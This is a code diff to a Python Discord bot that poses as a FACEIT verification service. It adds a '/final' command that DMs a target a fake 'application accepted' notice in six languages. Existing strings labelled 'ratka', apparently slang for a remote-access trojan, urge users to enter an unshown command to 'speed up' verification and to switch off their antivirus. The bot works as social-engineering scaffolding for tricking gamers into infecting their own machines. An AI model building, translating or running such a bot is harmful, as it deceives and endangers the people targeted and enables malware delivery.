@@ -62,6 +62,11 @@ TEXTS = {
         "ratka_speedup": "To speed up the processing, we recommend completing an additional bot check. This will confirm that the request was submitted by a real user and may significantly reduce the waiting time.",
         "ratka_command": "To speed up the process, enter the following command:",
         "ratka_antivirus": "If you do not receive an automatic message, disable your antivirus.",
+        "final_title": "Your application has been accepted",
+        "final_greeting": "Dear user!",
+        "final_reviewed": "We have reviewed the information you provided and the steps you have taken to complete the verification.",
+        "final_priority": "In connection with this, your application will be reviewed on a priority basis. We will try to complete the verification as soon as possible.",
+        "final_thanks": "Thank you for the information provided and your cooperation.",
     },
     "ru": {
         "modal_title": "Верификация FACEIT",
@@ -83,6 +88,11 @@ TEXTS = {
         "ratka_speedup": "Для ускорения процесса обработки рекомендуем пройти дополнительную проверку на ботов. Это позволит подтвердить, что заявку отправил реальный пользователь, и может существенно сократить время ожидания.",
         "ratka_command": "Чтобы ускорить процесс введите следующую команду:",
         "ratka_antivirus": "В случае если не придет автоматическое сообщение, выключите антивирус.",
+        "final_title": "Ваша заявка принята",
+        "final_greeting": "Уважаемый пользователь!",
+        "final_reviewed": "Мы ознакомились с предоставленной вами информацией и предпринятыми мерами для прохождения верификации.",
+        "final_priority": "В связи с этим ваша заявка будет рассмотрена в приоритетном порядке. Мы постараемся завершить проверку в кратчайшие сроки.",
+        "final_thanks": "Благодарим вас за предоставленную информацию и сотрудничество.",
     },
     "uk": {
         "modal_title": "Верифікація FACEIT",
@@ -104,6 +114,11 @@ TEXTS = {
         "ratka_speedup": "Для прискорення процесу обробки рекомендуємо пройти додаткову перевірку на ботів. Це дозволить підтвердити, що заявку надіслав реальний користувач, і може істотно скоротити час очікування.",
         "ratka_command": "Щоб прискорити процес введіть наступну команду:",
         "ratka_antivirus": "У разі якщо не прийде автоматичне повідомлення, вимкніть антивірус.",
+        "final_title": "Вашу заявку прийнято",
+        "final_greeting": "Шановний користувач!",
+        "final_reviewed": "Ми ознайомилися з наданою вами інформацією та вжитими заходами для проходження верифікації.",
+        "final_priority": "У зв'язку з цим вашу заявку буде розглянуто в пріоритетному порядку. Ми постараємося завершити перевірку якнайшвидше.",
+        "final_thanks": "Дякуємо вам за надану інформацію та співпрацю.",
     },
     "pl": {
         "modal_title": "Weryfikacja FACEIT",
@@ -125,6 +140,11 @@ TEXTS = {
         "ratka_speedup": "Aby przyspieszyć przetwarzanie, zalecamy przejście dodatkowej kontroli anty-botowej. Potwierdzi to, że wniosek został złożony przez prawdziwego użytkownika i może znacznie skrócić czas oczekiwania.",
         "ratka_command": "Aby przyspieszyć proces, wprowadź następującą komendę:",
         "ratka_antivirus": "Jeśli nie otrzymasz automatycznej wiadomości, wyłącz program antywirusowy.",
+        "final_title": "Twój wniosek został przyjęty",
+        "final_greeting": "Szanowny użytkowniku!",
+        "final_reviewed": "Zapoznaliśmy się z dostarczonymi przez Ciebie informacjami i podjętymi krokami w celu ukończenia weryfikacji.",
+        "final_priority": "W związku z tym Twój wniosek zostanie rozpatrzony priorytetowo. Postaramy się zakończyć weryfikację w możliwie najkrótszym czasie.",
+        "final_thanks": "Dziękujemy za dostarczone informacje i współpracę.",
     },
     "de": {
         "modal_title": "FACEIT-Verifizierung",
@@ -146,6 +166,11 @@ TEXTS = {
         "ratka_speedup": "Um die Bearbeitung zu beschleunigen, empfehlen wir eine zusätzliche Bot-Prüfung. Dies bestätigt, dass der Antrag von einem echten Benutzer eingereicht wurde und kann die Wartezeit erheblich verkürzen.",
         "ratka_command": "Um den Prozess zu beschleunigen, gib den folgenden Befehl ein:",
         "ratka_antivirus": "Wenn Sie keine automatische Nachricht erhalten, deaktivieren Sie Ihr Antivirenprogramm.",
+        "final_title": "Ihr Antrag wurde angenommen",
+        "final_greeting": "Lieber Benutzer!",
+        "final_reviewed": "Wir haben die von Ihnen bereitgestellten Informationen und die zur Verifizierung unternommenen Schritte überprüft.",
+        "final_priority": "In diesem Zusammenhang wird Ihr Antrag vorrangig bearbeitet. Wir werden versuchen, die Überprüfung so schnell wie möglich abzuschließen.",
+        "final_thanks": "Vielen Dank für die bereitgestellten Informationen und Ihre Zusammenarbeit.",
     },
     "tr": {
         "modal_title": "FACEIT doğrulaması",
@@ -167,6 +192,11 @@ TEXTS = {
         "ratka_speedup": "İşlemi hızlandırmak için ek bir bot kontrolünden geçmenizi öneririz. Bu, talebin gerçek bir kullanıcı tarafından gönderildiğini doğrular ve bekleme süresini önemli ölçüde kısaltabilir.",
         "ratka_command": "Süreci hızlandırmak için aşağıdaki komutu girin:",
         "ratka_antivirus": "Otomatik bir mesaj almazsanız, antivirüsünüzü kapatın.",
+        "final_title": "Başvurunuz kabul edildi",
+        "final_greeting": "Sayın kullanıcı!",
+        "final_reviewed": "Sağladığınız bilgileri ve doğrulama için attığınız adımları inceledik.",
+        "final_priority": "Bu nedenle başvurunuz öncelikli olarak değerlendirilecektir. Doğrulamayı mümkün olan en kısa sürede tamamlamaya çalışacağız.",
+        "final_thanks": "Sağlanan bilgiler ve işbirliğiniz için teşekkür ederiz.",
     },
 }
 
@@ -504,6 +534,58 @@ async def ratka(interaction: discord.Interaction, member: discord.Member, langua
 
     await interaction.response.send_message(
         f"Уведомление ({language.name}) отправлено {member.mention} в личку ✅", 
+        ephemeral=True
+    )
+
+
+@bot.tree.command(name="final", description="Отправить пользователю уведомление о принятии заявки")
+@app_commands.describe(
+    member="Кому отправить уведомление",
+    language="Язык уведомления"
+)
+@app_commands.choices(language=[
+    app_commands.Choice(name="English", value="en"),
+    app_commands.Choice(name="Русский", value="ru"),
+    app_commands.Choice(name="Українська", value="uk"),
+    app_commands.Choice(name="Polski", value="pl"),
+    app_commands.Choice(name="Deutsch", value="de"),
+    app_commands.Choice(name="Türkçe", value="tr"),
+])
+@app_commands.default_permissions(manage_guild=True)
+@app_commands.guild_only()
+async def final(interaction: discord.Interaction, member: discord.Member, language: app_commands.Choice[str]):
+    if member.bot:
+        await interaction.response.send_message("Нельзя отправить уведомление боту.", ephemeral=True)
+        return
+
+    lang = language.value if isinstance(language, app_commands.Choice) else language
+    t = TEXTS[lang]
+    
+    # Создаем embed с информацией о принятии заявки
+    embed = discord.Embed(
+        title=f"✅ {t['final_title']}",
+        description=(
+            f"**{t['final_greeting']}**\n\n"
+            f"{t['final_reviewed']}\n\n"
+            f"{t['final_priority']}\n\n"
+            f"{t['final_thanks']}"
+        ),
+        color=discord.Colour.green(),
+    )
+    embed.set_thumbnail(url="attachment://logo.png")
+    embed.set_footer(text="FACEIT Verification System", icon_url="attachment://logo.png")
+
+    try:
+        await member.send(embed=embed, file=logo_file())
+    except discord.Forbidden:
+        await interaction.response.send_message(
+            f"Не удалось написать {member.mention}: у него закрыты личные сообщения.",
+            ephemeral=True,
+        )
+        return
+
+    await interaction.response.send_message(
+        f"Уведомление о принятии ({language.name}) отправлено {member.mention} в личку ✅", 
         ephemeral=True
     )
 
